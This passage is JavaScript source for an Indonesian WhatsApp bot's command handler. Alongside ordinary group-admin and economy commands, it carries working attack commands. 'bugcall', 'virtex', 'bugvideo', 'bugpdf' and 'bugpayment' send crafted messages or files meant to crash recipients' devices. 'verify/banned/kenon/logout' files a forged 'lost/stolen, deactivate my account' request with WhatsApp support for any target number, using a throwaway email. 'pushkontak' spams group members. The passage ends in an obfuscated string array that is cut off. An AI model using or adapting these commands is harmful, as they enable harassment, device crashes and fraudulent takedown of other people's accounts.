             case prefix+'jc':
             case prefix+'bugcall':
                if (!isCreator && !isGroupAdmins) return reply(`Khusus admin grup`)
                if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
			    var teks = `\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${q}\n\n\n\n\n\n`
			conn.relayMessage(from, {
                        scheduledCallCreationMessage: {
                        callType: "AUDIO",
                        scheduledTimestampMs: Date.now(),
                        title: teks
                        }
                    }, { quoted: msg })
				break
		    case prefix+'virtex':
          	 if (!isCreator) return reply(`mess.only.ownerB`)
               if (args.length < 2) return reply(`Kirim perintah ${command} target`)
               let lan = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
               conn.sendMessage(from, {
                     text: virtex(sender)
                }, {
                    quoted: msg
                })
			    break
			case prefix+'bugvideo':
			case prefix+'bugvid':
          	 if (!isCreator) return reply(`mess.only.ownerB`)
               conn.sendMessage(from, {
                        video: fs.readFileSync('./vanz_other/bugvid.mp4'),
                        caption: `hp tertentu yang bisa kena`,
                        gifPlayback: true
                    }, {
                      quoted: msg 
                 })
			    break
			case 'pushcontact':
            case 'pushkontak': {
               if (!isCreator) return reply(mess.OnlyOwner)
               if (!isGroup) return reply(`The feature works only in grup`)
               if (!q) return reply(`text?`)
               let daf = await groupMetadata.participants.filter().map(v => v.id)
              reply(`Success in pushing the message to contacts`)
               for (let vanz of daf) {
               conn.sendMessage(vanz, { text: q})
               }  
               reply(`Done`)
               }
               break
            case prefix+'bugpayment':
                if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
			    var teks = `${q}`
			conn.relayMessage(from, {  
              requestPaymentMessage: { 
                 message: { 
                 extendedTextMessage: { 
                     text: teks, 
                     currencyCodeIso4217: 'INR',
                     requestFrom: '0@s.whatsapp.net',
                     expiryTimestamp: 8000, amount: 1,
                     contextInfo: {
                       "externalAdReply": {
                         "title": `PAPA XEON`,
                         "body": `my friend ${pushname}`,
                         mimetype: 'audio/mpeg', caption: ` ${teks}`,
                         showAdAttribution: true,
                         sourceUrl: hmm.linkmenu,
                         thumbnailUrl: hmm.wa,
                         }
                       }
                     }
                   }
                 }
                })
                break
            case 'bugpdf':{
               if (!isCreator) return reply(mess.OnlyOwner)
               var anuin = fs.readFileSync('./media/ngeselin.BIN')
                conn.sendMessage(from, { document: anuin, mimetype: 'application/pdf', fileName: `     ${q}.pdf`, title: `    .pdf` }, { quoted: msg })
                 }
                break
            case 'verify': case 'banned': case 'kenon': case 'logout': {
 if (!isCreator) return m.replygcxeon(`Khusus Creator`)
 if (!q) return reply(`Targetnya?`)
 var axioss = require ("axios")
 var cheerio = require("cheerio")
 let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
 url,
 method: "POST",
 data: form,
 headers: {
cookie
 }
})
reply(`succes ${command} ke nomer tersebut\n
note :
jika no masih centang 2 atau aktif no tersebut sudah terkena ${command} sebelumnya....`)
            }
            break
			// Group Menu
			case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
			    url = 'https://chat.whatsapp.com/'+url
				reply(url)
				break
			case prefix+'setppgrup': case prefix+'setppgc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (isImage || isQuotedImage) {
				  var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/ppgc${from}.jpeg`)
			      await conn.updateProfilePicture(from, { url: media })
				  .then( res => {
					reply(`Sukses`)
					fs.unlinkSync(media)
				  }).catch(() => reply(mess.error.api))
				} else {
			      reply(`Kirim/balas gambar dengan caption ${command}`)
				}
				break
			case prefix+'setnamegrup': case prefix+'setnamegc':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await conn.groupUpdateSubject(from, q)
			    .then( res => {
				  reply(`Sukses`)
				}).catch(() => reply(mess.error.api))
			    break
			case prefix+'setdesc': case prefix+'setdescription':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
				await conn.groupUpdateDescription(from, q)
			    .then( res => {
			      reply(`Sukses`)
				}).catch(() => reply(mess.error.api))
				break
		    case prefix+'afk':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (isAfkOn) return reply("Kakak Sudah Afk Sebelumnya")
                let reason = q ? q : 'Nothing.'
                afk.addAfkUser(sender, Date.now(), reason, _afk)
                reply(`${pushname} Sedang AFK\nDengan Alasan : ${reason}`)
                break
			case prefix+'group': case prefix+'grup':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				if (args.length < 2) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				if (args[1] == "close") {
				  conn.groupSettingUpdate(from, 'announcement')
				  reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
				} else if (args[1] == "open") {
				  conn.groupSettingUpdate(from, 'not_announcement')
				  reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
				} else {
				  reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
				}
			    break
			case prefix+'revoke':
			    if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins) return reply(mess.GrupAdmin)
				if (!isBotGroupAdmins) return reply(mess.BotAdmin)
				await conn.groupRevokeInvite(from)
			    .then( res => {
				  reply(`Sukses menyetel tautan undangan grup ini`)
				}).catch(() => reply(mess.error.api))
				break
	        case prefix+'delete': case prefix+'del': case prefix+'d':
                   if (!isQuotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
                   if (!quotedMsg.fromMe) return reply(`Hanya bisa menghapus chat dari bot`)
                   conn.sendMessage(from, { delete: { fromMe: true, id: quotedMsg.id, remoteJid: from }})
                   break
            case prefix+'delete1':
                   if (!isQuotedMsg) return reply(`Balas chat dari bot yang ingin dihapus`)
                   conn.sendMessage(from, { delete: { fromMe: false, id: quotedMsg.id, remoteJid: from }})
                   break
            case prefix+'bcgc':
            case prefix+'bcgroup': {
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}bcgc* teks`)
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${q}`
                conn.sendMessage(i, {
                    text: a, contextInfo: {
                      externalAdReply: {'showAdAttribution': !![],
                        title: `Broadcast by ${ownerName}`,
	                    body: botName,
	                    thumbnail: fs.readFileSync(pathimg1),
	                    sourceUrl: hmm.linkmenu,
                        mediaType: 289,
                        renderLargerThumbnail: false
                      }
                    }
                  }, { quoted: msg })
                }
                reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case prefix+'sc':
            case prefix+'script':
            case prefix+'scriptbot':
                let uy = `Script Ini tidak dijual\nScript akan terus dikembangkan oleh ${ownerName}`
                conn.relayMessage(from,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'IDR',
                          amount1000: '50000',
                          requestFrom: creatorNumber,
                          noteMessage: {
                             extendedTextMessage: {
                                text: uy,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                break
            case 'xenncrashpc1':
                  conn.sendMessage(from, {
                   text: 'Powered By Xinn', 
                   templateButtons: buttonsDefault
                  })
                break
		    case prefix+'tagall': case prefix+'infoall':
                if (!isGroup) return reply(mess.OnlyGrup)
		        if (!isGroupAdmins) return reply(mess.GrupAdmin)
		        let participants = msg.isGroup ? await groupMetadata.participants : ''
                let tekss = `*👤 TAG ALL 👤*\n\n*Pesan : ${q ? q : 'Nothing'}*\n\n`
                for (let mem of participants) {
                  tekss += `• @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(from, { text: tekss, mentions: participants.map(a => a.id) }, { quoted: msg })
                break
            case prefix+'kick':
                if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let blockwww = m.mentionedJid ? m.mentionedJid : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(from, [blockwww], 'remove')
                .then( res => {
				  var teks = `Sukses kick ${q} 
di grup ${groupName}`
                conn.sendMessage(from, {
                    text: teks, mentions: [q.replace(/[^0-9]/g, '') + '@s.whatsapp.net']
                      }, { quoted: msg })
				}).catch(() => reply(mess.error.api))
                break
            case prefix+'prankgc':
			    var anu = `${pushname} mengeluarkan Anda
`
			conn.relayMessage(from, {
                        scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: 1200,
                        title: anu
                        }
                    }, { quoted: msg })
				break
            case prefix+'add':
                if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length < 2) return reply(`Kirim Perintah ${command} 628`)
                let blockwwww = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await conn.groupParticipantsUpdate(from, [blockwwww], 'add')
                .then( res => {
				  var teks = `Sukses kick ${q} 
di grup ${groupName}`
                conn.sendMessage(from, {
                    text: teks, mentions: [q.replace(/[^0-9]/g, '') + '@s.whatsapp.net']
                      }, { quoted: msg })
				}).catch(() => reply(mess.error.api))
                break
            case prefix+'promote': case prefix+'pm':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (mentionUser.length !== 0) {
                     conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
                     .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
                     .catch(() => reply(mess.error.api))
                   } else if (isQuotedMsg) {
                     conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
                     .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
                     .catch(() => reply(mess.error.api))
                   } else {
                     reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
                   }
                   break
                case prefix+'demote':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (mentionUser.length !== 0) {
                     conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
                     .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
                     .catch(() => reply(mess.error.api))
                   } else if (isQuotedMsg) {
                     conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
                     .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
                     .catch(() => reply(mess.error.api))
                   } else {
                     reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
                   }
                   break
			case prefix+'hidetag':
		        if (!isGroup) return reply(mess.OnlyGrup)
				if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
			    let mem = [];
		        groupMembers.map( i => mem.push(i.id) )
				conn.sendMessage(from, { text: q ? q : '', mentions: mem })
			    break
			case prefix+'antilink':
                   if (!isGroup) return reply(mess.OnlyGrup)
                   if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                   if (!isBotGroupAdmins) return reply(mess.BotAdmin)
                   if (args.length === 1) return reply(`Pilih enable atau disable`)
                   if (args[1].toLowerCase() === 'enable') {
                     if (isAntiLink) return reply(`Udah aktif`)
                     antilink.push(from)
                     fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                     reply('Antilink grup aktif')
                   } else if (args[1].toLowerCase() === 'disable') {
                     if (!isAntiLink) return reply(`Udah nonaktif`)
                     let anu = antilink.indexOf(from)
                     antilink.splice(anu, 1)
                     fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                     reply('Antilink grup nonaktif')
                   } else {
                     reply(`Pilih enable atau disable`)
                   }
                   break
             case prefix+'welcome':
                if (!isGroup) return reply(mess.OnlyGrup)
                if (!isGroupAdmins && !isOwner && !isCreator) return reply(mess.GrupAdmin)
                if (args.length < 2) return reply(`Pilih enable atau disable`)
                if (args[1].toLowerCase() === "enable") {
                   if (isWelcome) return reply(`Welcome sudah aktif`)
                   welcome.push(from)
                   fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                   reply(`Sukses mengaktifkan welcome di grup ini`)
                } else if (args[1].toLowerCase() === "disable") {
                   if (!isWelcome) return reply(`Welcome sudah nonaktif`)
                   var posi = welcome.indexOf(from)
                   welcome.splice(posi, 1)
                   fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                   reply(`Sukses menonaktifkan welcome di grup ini`)
                } else {
                   reply(`Pilih enable atau disable`)
                }
                break
			// Bank & Payment Menu
			case prefix+'topbalance':{
                balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
                let top = '*── 「 TOP BALANCE 」 ──*\n\n'
                let arrTop = []
				var total = 10
				if (balance.length < 10) total = balance.length
                for (let i = 0; i < total; i ++){
                    top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
                    arrTop.push(balance[i].id)
                }
                mentions(top, arrTop, true)
            }
                break
            case prefix+'buylimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $150 balance`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                giveLimit(sender, parseInt(args[1]), limit)
                reply(monospace(`Pembeliaan limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Limit : ${getLimit(sender, limitCount, limit)}/${limitCount}`))
            }
                break
			case prefix+'transfer':
            case prefix+'tf':{
                 if (args.length < 2) return reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @0 2000`)
                 if (mentioned.length == 0) return reply(`Tag orang yang ingin di transfer balance`)
                 if (!args[2]) return reply(`Masukkan nominal nya!`)
                 if (isNaN(args[2])) return reply(`Nominal harus berupa angka!`)
                 if (args[2].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                 if (args[2].includes("-")) return reply(`Jangan menggunakan -`)
                 var anu = getBalance(sender, balance)
                 if (anu < args[2] || anu == 'undefined') return reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[2]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                 kurangBalance(sender, parseInt(args[2]), balance)
                 addBalance(mentioned[0], parseInt(args[2]), balance)
                 reply(`Sukses transfer balance sebesar $${args[2]} kepada @${mentioned[0].split("@")[0]}`)
            }
                 break
            case prefix+'setpp': case prefix+'setppbot':
		        if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
		        if (isImage || isQuotedImage) {
				  var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/ppbot.jpeg`)
				  var data =  await conn.updateProfilePicture(botNumber, { url: media })
			      fs.unlinkSync(media)
				  reply(`Sukses`)
				} else {
				  reply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
				}
				break
            case prefix+'shutdown':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                reply(`Otsukaresama deshita🖐`)
                await sleep(3000)
                process.exit()
                break
            case prefix+'restart':
                if (!isOwner && !isCreator) return reply(mess.OnlyOwner)
                reply('Proses....')
                exec('pm2 restart all')
                break
            case prefix+'buygamelimit':
            case prefix+'buyglimit':{
                if (args.length < 2) return reply(`Kirim perintah *${prefix}buyglimit* jumlah game limit yang ingin dibeli\n\nHarga 1 game limit = $150 balance\nPajak $1 / $10`)
                if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
                if (isNaN(args[1])) return reply(`Harus berupa angka`)
                if (args[1].toLowerCase() === 'infinity') return reply(`Yahaha saya ndak bisa di tipu`)
                let ane = Number(parseInt(args[1]) * 150)
                if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
                kurangBalance(sender, ane, balance)
                givegame(sender, parseInt(args[1]), glimit)
                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, balance)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
            case prefix+'jadibot': {
               jadibot(conn, msg, from)
               }
               break
			case prefix+'limit': case prefix+'balance':
			case prefix+'ceklimit': case prefix+'cekbalance':
			    if (mentioned.length !== 0){
					var Ystatus = ownerNumber.includes(mentioned[0])
					var isPrim = Ystatus ? true : _prem.checkPremiumUser(mentioned[0], premium)
				    var ggcount = isPrim ? gcounti.prem : gcounti.user
                    var limitMen = `${getLimit(mentioned[0], limitCount, limit)}`
                    reply(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : limitMen}/${limitCount}\nLimit Game : ${cekGLimit(mentioned[0], ggcount, glimit)}/${ggcount}\nBalance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                } else {
                    var limitPrib = `${getLimit(sender, limitCount, limit)}/${limitCount}`
                    reply(`Limit : ${isPremium ? 'Unlimited' : limitPrib}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                }
				break
			default:
		    }
		    // xixixi
		    function _0x526c7c(_0x313be6,_0x208150,_0x1e6298,_0x3a3c9d,_0x1eccff){return _0x41b0(_0x208150-0x84,_0x1eccff);}function _0x480ff3(_0x568bbc,_0x43e306,_0x911761,_0x393e73,_0x468354){return _0x41b0(_0x393e73- -0x33e,_0x468354);}function _0x2fe230(_0x1ccbe6,_0x499c37,_0x498d79,_0x5a338c,_0x37d9a9){return _0x41b0(_0x499c37- -0x21a,_0x1ccbe6);}function _0x3c8e(){const _0x218f8a=['ance\x20','|1|4','inal','Masuk','stop\x20','omor','enola','rup','i\x20law','pa\x20*','Kumpu','lahka','mor*\x20','\x0aGame','nan\x20I','\x20adal','push','\x20meng','Nomin','\x20Angk','diah\x20',',\x20kar','erseb','LAYER','e!\x20Ka',',\x20sil','chat!','i\x20per','h\x20sat','Putar','sil\x20d','teman','uhi\x20s','24tzopfB','6956015NkWhaT','\x205\x20sa','sendM','ama\x20d','an\x20No','gan\x20k','hkan\x20','sendi','mampu','makan','sende','Sad\x20a','\x20dari','/star','berha','r*\x20un','\x20prib','nya\x20n','rim\x20i',',\x20unt','penan','|Hai\x20','.ww\x20j','Tag\x20L','tau\x20m','ah\x0a\x0aC',',\x20ket','OnlyG','mu\x20mi','\x20Masi','stop','werew','mor\x20p','!\x0a\x0aCo','quote','Dalam','seer','n\x20pes','\x20diri','adi\x20u','7️⃣','wa\x20*','9️⃣','*🐺\x20-\x20','game\x20','k\x20mem','balon','\x0a/sta','sino','ictac','ma\x20pe','Kirim','ofile','balan','n\x20ini','\x20@tag','\x20nomo','us\x20se','kukan','ill\x20h','h\x20dig','\x20Dipe','Sukse','k\x20kam','.ww\x20e','an\x20ba','Belum','state','tang','Ketik','au\x20na','ng\x20Be','\x20mena','ranka','\x20angk','lance','\x20maxi','elete','menfe','secar','guard','orang','ce\x20Ti','!*\x0aBa','rus\x20B','ang\x20i','\x20memi','\x20terd','gan\x20b','ikiri','toLow','mer\x20t','rtner','461706ZsYyOq','esi\x20C','atang','ntoh\x20','*Pene','|Secr','sesi','arena','ngiri','i\x20cha','r\x20tid','ai\x20Pe','nde.\x20','\x20pili','lian.','Silah','toh\x20:','effec','mat\x20m','4️⃣','amu!\x20','alah\x20','\x20casi','\x20pada','ai\x20ch','r|Sec','m\x0a\x0aCo','\x20-\x20_u','rer','an\x20na','1370mMxxjZ','p\x20ini','gkin\x20','berga','g*\x20',')\x20@','g\x20nom','k\x20Per','ng.\x0a*','unaka','njaha','ret|H','uk\x20me','hatsA','perma','da\x20ba','annya','anya\x20','an\x20da','Casin','\x20dala','\x20ini,','AME*\x0a','gi\x20pl','ima\x20a','*\x20@ta','./dat','iberh','seper','\x20Nome','alam','\x20lawa','Hai\x20','an\x20no','dak\x20a','dibaw','ekuas','olf','gan\x20s','hasia','|Nama','nmu','Mencu','lasan','Tidak','aftar','ai\x20se','\x20tict','ni\x0a\x0a*','\x20suda','at!\x20❌',',\x20den','n\x20cek','alas.','xhJju','Nomor','nerim','Sedan','.ww\x20c','write','memul','\x20kill','jgZPT','hat\x20k',',\x20kam','\x20untu','ntika','\x20Desa','a\x20ber','\x0a\x0aCon','\x20ini\x20','g\x20Ada','ahulu','\x20Diaj','dak\x20k','buka\x20','ons','da!','[🔎]\x20M','lai','t\x20Pel','sino*','\x20ada\x20','\x20mema','aan\x20y','iri\x20s','alanc','[⚠️]\x20S','ga,\x20s','an.\x20P','wan\x20T','sung\x20','\x20pesa','json','g\x20tan','mat\x20D','hanmu','ING','ntuk\x20','\x20Bebe','i\x20ada','pp!','ta\x20Ke','upi,\x20','r\x20bot','_untu','in*\x20u','k\x20Men','ous\x20C','elum\x20','an\x20pi','ena\x20b','ayer\x20','Peran','il\x20me','ti\x20co','engec','u\x20ada','deltt','eneri','u\x20sed','\x20buka','Group','\x20anda','kan\x20m','Inval','onWha','ticta','pat\x20d','h\x20pla','ah\x20pl','\x20form','mengh','toh\x20F','\x0a\x0aDar','u\x20tel','ak\x20te','☠️\x20','an\x20se','elind','isdea','a\x20nih','\x20nome',',\x20Kam','Waktu','\x20mala','hat\x20r','n\x20rah','an\x20tu','\x20bet\x20','\x0aJuml','h\x20mul','\x201000','dak!\x20','ain\x20D','ik\x20*','ya\x0a*L','lah\x20m','\x20perm','eh\x20te','\x20play','mu.','ttt','Maksi','\x20Game','\x20nya!','m\x20pro','ayer','tik\x20t','minal','bet','sia\x20i','ingin','ndiri','n\x20ses','TicTa','ni\x20te','uble/','ian','122577iCoWmZ','kamu\x20','ma\x20ra','OLF\x20P','mpai\x20','getNa','menge','❌\x0a\x0a/s','omina','\x20Sesi','msg_2','at\x0a\x0a/','ZKLFy','ut,\x20s','Room\x20','4|1|2','s\x20pla','erCas','searc','mal\x201','n\x20dar','\x20berm','ihapu','\x0a\x0a*Li','/stop','jid','iliki','emain','kan\x20p','expir','am\x20se','lesai','ditan','wpc\x20d','Terle','ri\x20se','\x20sesi','jadi\x20','atsap','asih\x20','coold','er\x20no','pemai','anony','BAE5','\x20raha','um\x20di','000\x20b',',\x20tid','Masih','erewo','\x20mati','ontak','*\x0a\x0a','pulan','WAITI','an\x20ya','top\x20-','t\x20and','mengi','ungi\x20','.\x0a\x0a*L','ilahk','ync','\x20ters','at_\x0a/','pesan','kanmu','fil\x20k','melih','at\x20ro','ibuat','hapus','ulai\x20','rmain','inclu','g\x20bel','a|Pes','at:\x0a','r|Nam','embuk','ontoh','des','t_\x0a/s','punya','!\x20❌\x0a\x0a','\x0aHai\x20','ngi\x0a*','i\x20set','Skill','\x20\x0aCon','memen','\x201\x20or','\x20peri','sendC','\x20voti','dapat','6️⃣','si\x20ch','m\x20roo','rdaft','_Pasa','ukan\x20','asing','zYXWE','\x20keru','da\x20at','k\x20mel','ara\x20p','start','splic','toUpp','ungki','ni,\x20s','ya\x20ma','lf*\x20','ang\x20k','digun','amu\x20p','mu\x0aKe','asino','o\x20💰\x0a\x0a',',\x20tet','Para\x20','✅\x20Vot','Janga','di\x20gr','t\x20-\x20_','eliha','\x20game','lah\x20*','i\x20:\x20*','\x20sala','text','ggant','sil\x20M','X\x20COM','ctoe\x20','n\x20kam','aka\x20p','ui\x20pe','penuh','t\x20Yan','edia:','i\x20Kak','wpc\x20s','matis','denga','nghap','tuk\x20m','Maaf\x20','jumla','erika','mu\x20pu','ang\x20a','indun','ghapu','i\x20ini','tidak','u\x20bis','❓\x20-\x20E','iap\x20m','next','\x20akan','tuk\x20b','time','spada','al\x20ad','own','lai,\x20','bih\x20D','\x0a*Lis','split','m\x20ses','\x20bisa','ttc','2️⃣','Y/N\x20u','sendp','ce\x20@t','ist\x20p','a\x20pes','laika','tikan','essag','ihir\x20','\x20dapa','atau\x20','\x20Mena','erhas','memba','hir\x20u','•\x20@','wwpc','ainan','unya,',':*\x0a','n\x20*Ma','8️⃣','k\x20bis','k\x20*.w','liki,','oin\x0a','cari\x20','casin','Jika\x20','kan\x20d','ill\x20u','endpr','isvot','5️⃣','wolf*','rlang','h\x20par','belum','ah\x20di','ngin\x20','Horre','then','ng-ma','\x20_unt',',\x20mun','uka\x20i','126pkGMSE','Tujua','ek\x20Ba','dinga','ctoe','an\x201\x20','pus\x20S','undef','k\x20ber','trim','\x20di\x20A','yer\x20t','Warga','Kak','ang\x20m','wpc\x20k','ktu,\x20','72RQMWsi','rapa\x20','\x20deng','ntita','hat\x0a\x0a','i\x20ses','Teman','3️⃣','et|Ha','elah\x20','votin','berla','ance\x0a','yer','*Kamu','dibal','h\x20ter','lah\x20d','i\x20gam','\x0aKiri','repla','Ingin','e\x20mu!','\x20TicT','n\x0a\x0aHa','ctoe*','role','a\x20ide','\x20Habi','CHATT','Untuk','\x20tela','ak\x20da','ijala','meran','orcer','h\x20dim','nonym','rawan','join','ah\x20','idak\x20','al\x20ha','Pemai','skip','ndung','n\x20oto','rtaru','ekuat','n\x20pem','an\x20fo','endir','\x20meli','nti\x20s','k\x20men','ang.','reply','diri\x20','m\x20(Y/','erann','m\x20ini','an\x20pa','i\x20tem','\x20Nya','n!\x0a•\x20','ncari','terak','kkan\x20','acToe','1️⃣','🎰\x20Kam','5\x20dan','-\x20_un','N)\x20un','ujuan','\x20sila','las\x20b','Gunak','lang\x20','\x20send','at\x0a/s','ole\x20p','WEREW','g,\x20si','n\x20Cha','\x20❌\x0a\x0a/','menti','tart\x0a','t:\x0a','cToe\x0a','t\x20pla','ngan\x20','girim','MENFE','value','yMzhh','taruh','ntah\x20','ar!','h\x20unt','20JkqYKc','n\x20Dit','h\x20hab','uh\x20pl','|3|0','nggu\x20',',\x20Ser','\x20masi','xxQTY','pagi','bunuh','enghe','ahasi','sudah','\x20Kamu','\x20dimu','Minim','entik','\x20bala','tsApp','eto_b','@s.wh','tak\x20p','nform','engha','etik\x20','awaba','at_','sekal','\x20Sela','Hanya','[👨👩]\x20','ri\x20pe','ah\x20be','encuk','asukk','kan\x20j','um\x20se','yer\x20y','pu\x20Se','sil\x20m','n\x20Har','ain\x20a','Game\x20','lengt','ati-h','yer\x20:','t\x20men','bUqzE','30\x20de','ain!','malem','n\x20kir','sing\x20','ormat','am\x20in','inkan','amu\x20m','ag\x20un','ohon\x20','s\x20ses','an\x20sk','Perma','\x20Tema','numbe','lkan\x20','mous','p.net','kupi\x20','rt\x20-\x20','ga,\x20m','asia\x20','Nomer','\x20Pesa','al\x205\x20','\x20Untu','4498144